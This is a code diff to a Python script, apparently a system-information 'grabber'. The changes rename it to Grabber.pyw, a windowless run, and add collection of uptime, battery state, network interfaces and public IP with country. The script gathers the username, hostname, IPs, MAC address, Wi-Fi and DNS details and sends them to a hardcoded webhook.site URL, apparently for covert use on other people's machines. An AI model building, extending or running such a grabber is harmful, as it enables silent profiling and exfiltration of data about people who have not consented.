@@ -11,6 +11,10 @@ Features:
 - DNS-Server (Best-Effort)
 - Zeitstempel
 - Script-Version
+- Uptime (Betriebszeit)
+- Akku-Status (falls vorhanden)
+- Netzwerk-Interface-Liste
+- Public IP + Land
 - Hostname
 - Private IP (best-effort)
 - Public IP (HTTPS)
@@ -26,10 +30,10 @@ Notes:
 - webhook.site is ideal for school/VPN networks and debugging
 
 Run:
-  python pc_info.py
+  python Grabber.pyw
 
 Tests:
-  python pc_info.py --selftest
+  python Grabber.pyw --selftest
 """
 
 from __future__ import annotations
@@ -37,6 +41,7 @@ from __future__ import annotations
 import ctypes
 import datetime
 import getpass
+import json
 import os
 import platform
 import shutil
@@ -55,7 +60,7 @@ from typing import Dict, List, Tuple
 # CONFIG
 # -----------------
 WEBHOOK_SITE_URL = "https://webhook.site/f17e6915-aca9-40d8-afde-79214a48718b"
-SCRIPT_VERSION = "1.3.0"
+SCRIPT_VERSION = "1.4.0"
 
 
 # -----------------
@@ -262,6 +267,153 @@ def get_dns_servers() -> List[str]:
 
     return servers if servers else ["unbekannt"]
 
+
+def get_uptime_seconds() -> int | None:
+    if sys.platform.startswith("win"):
+        try:
+            GetTickCount64 = ctypes.windll.kernel32.GetTickCount64  # type: ignore[attr-defined]
+            GetTickCount64.restype = ctypes.c_ulonglong
+            ms = int(GetTickCount64())
+            return ms // 1000
+        except Exception:
+            return None
+
+    if sys.platform.startswith("linux"):
+        try:
+            with open("/proc/uptime", "r", encoding="utf-8") as f:
+                first = f.read().split()[0]
+                return int(float(first))
+        except Exception:
+            return None
+
+    if sys.platform == "darwin":
+        try:
+            raw = run_cmd(["sysctl", "-n", "kern.boottime"])
+            # Expected format: { sec = 1700000000, usec = 0, ... }
+            if "sec" in raw:
+                for part in raw.split(","):
+                    if "sec" in part:
+                        sec_str = "".join(ch for ch in part if ch.isdigit())
+                        if sec_str:
+                            boot_ts = int(sec_str)
+                            return int(datetime.datetime.now().timestamp() - boot_ts)
+        except Exception:
+            return None
+
+    return None
+
+
+def format_duration(seconds: int | None) -> str:
+    if seconds is None:
+        return "unbekannt"
+    if seconds < 0:
+        return "unbekannt"
+
+    days, rem = divmod(seconds, 86400)
+    hours, rem = divmod(rem, 3600)
+    minutes, _ = divmod(rem, 60)
+
+    parts = []
+    if days:
+        parts.append(f"{days} Tage")
+    if hours:
+        parts.append(f"{hours} Stunden")
+    if minutes or not parts:
+        parts.append(f"{minutes} Minuten")
+    return ", ".join(parts)
+
+
+def get_battery_info() -> Dict[str, str]:
+    info = {"status": "unbekannt", "percent": "unbekannt"}
+
+    if sys.platform.startswith("win"):
+        try:
+            class SYSTEM_POWER_STATUS(ctypes.Structure):
+                _fields_ = [
+                    ("ACLineStatus", ctypes.c_ubyte),
+                    ("BatteryFlag", ctypes.c_ubyte),
+                    ("BatteryLifePercent", ctypes.c_ubyte),
+                    ("Reserved1", ctypes.c_ubyte),
+                    ("BatteryLifeTime", ctypes.c_ulong),
+                    ("BatteryFullLifeTime", ctypes.c_ulong),
+                ]
+
+            status = SYSTEM_POWER_STATUS()
+            if ctypes.windll.kernel32.GetSystemPowerStatus(ctypes.byref(status)):
+                flags = status.BatteryFlag
+                if flags == 128:
+                    info["status"] = "Keine Batterie"
+                else:
+                    info["status"] = "Lädt" if status.ACLineStatus == 1 else "Entlädt"
+                    if status.BatteryLifePercent <= 100:
+                        info["percent"] = f"{status.BatteryLifePercent}%"
+        except Exception:
+            return info
+
+    elif sys.platform.startswith("linux"):
+        base = "/sys/class/power_supply"
+        try:
+            for entry in os.listdir(base):
+                if entry.startswith("BAT"):
+                    stat_path = os.path.join(base, entry, "status")
+                    cap_path = os.path.join(base, entry, "capacity")
+                    status_val = None
+                    cap_val = None
+                    try:
+                        with open(stat_path, "r", encoding="utf-8") as f:
+                            status_val = f.read().strip()
+                    except OSError:
+                        pass
+                    try:
+                        with open(cap_path, "r", encoding="utf-8") as f:
+                            cap_val = f.read().strip()
+                    except OSError:
+                        pass
+                    if status_val:
+                        info["status"] = status_val
+                    if cap_val:
+                        info["percent"] = f"{cap_val}%"
+                    return info
+        except Exception:
+            return info
+
+    elif sys.platform == "darwin":
+        raw = run_cmd(["pmset", "-g", "batt"])
+        for line in raw.splitlines():
+            if "%" in line:
+                parts = line.split(";")
+                if len(parts) >= 2:
+                    percent_part = parts[0]
+                    status_part = parts[1]
+                    percent_digits = "".join(ch for ch in percent_part if ch.isdigit())
+                    if percent_digits:
+                        info["percent"] = f"{percent_digits}%"
+                    info["status"] = status_part.strip()
+                    return info
+
+    return info
+
+
+def get_network_interfaces() -> List[str]:
+    try:
+        return sorted({name for _, name in socket.if_nameindex()})
+    except Exception:
+        return []
+
+
+def get_public_ip_with_country(timeout: float = 5.0) -> Tuple[str, str]:
+    try:
+        with urllib.request.urlopen("https://ipapi.co/json/", timeout=timeout) as r:
+            data = json.loads(r.read().decode("utf-8", errors="replace"))
+            ip = data.get("ip") or "unbekannt"
+            country = data.get("country_name") or data.get("country") or "unbekannt"
+            return ip, str(country)
+    except Exception:
+        pass
+
+    # Fallback to plain IP lookup
+    return get_public_ip(timeout), "unbekannt"
+
 def get_hostname() -> str:
     return socket.gethostname()
 
@@ -431,11 +583,18 @@ def build_lines() -> List[str]:
     dns_servers = get_dns_servers()
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     wifi = get_wifi_info()
+    uptime_text = format_duration(get_uptime_seconds())
+    battery = get_battery_info()
+    interfaces = get_network_interfaces()
+    public_ip, public_country = get_public_ip_with_country()
     lines: List[str] = [
         "System:",
         f"  OS: {os_info['name']}",
         f"  Version: {os_info['version']}",
         f"  Architektur: {os_info['arch']}",
+        "",
+        "Uptime:",
+        f"  {uptime_text}",
         "",
         "Benutzer:",
         f"  Username: {user_info['username']}",
@@ -448,6 +607,10 @@ def build_lines() -> List[str]:
         "Arbeitsspeicher:",
         f"  Gesamt: {total_ram}",
         f"  Frei: {free_ram}",
+        "",
+        "Akku:",
+        f"  Status: {battery['status']}",
+        f"  Prozent: {battery['percent']}",
         "",
         "Speicher:",
     ]
@@ -468,6 +631,14 @@ def build_lines() -> List[str]:
     for dns in dns_servers:
         lines.append(f"  - {dns}")
 
+    lines.append("")
+    lines.append("Netzwerk-Interfaces:")
+    if interfaces:
+        for name in interfaces:
+            lines.append(f"  - {name}")
+    else:
+        lines.append("  (keine Daten)")
+
     lines.extend([
         "",
         "Zeit:",
@@ -478,7 +649,7 @@ def build_lines() -> List[str]:
         "",
         f"PC-Name (Hostname): {get_hostname()}",
         f"Private IP: {get_private_ip()}",
-        f"Public IP: {get_public_ip()}",
+        f"Public IP: {public_ip} ({public_country})",
         f"MAC-Adresse: {get_mac_address()}",
         "WLAN:",
         f"  Interface: {wifi['interface']}",
@@ -559,6 +730,9 @@ def _selftest() -> int:
             self.assertIn("System:", lines)
             self.assertIn("DNS:", lines)
             self.assertIn("Script:", lines)
+            self.assertIn("Uptime:", lines)
+            self.assertIn("Akku:", lines)
+            self.assertIn("Netzwerk-Interfaces:", lines)
 
         def test_send_text_to_webhook_bad_url_raises(self):
             # This should raise URLError because host is invalid.
@@ -583,5 +757,4 @@ if __name__ == "__main__":
             pass
 
     raise SystemExit(code)
-
 
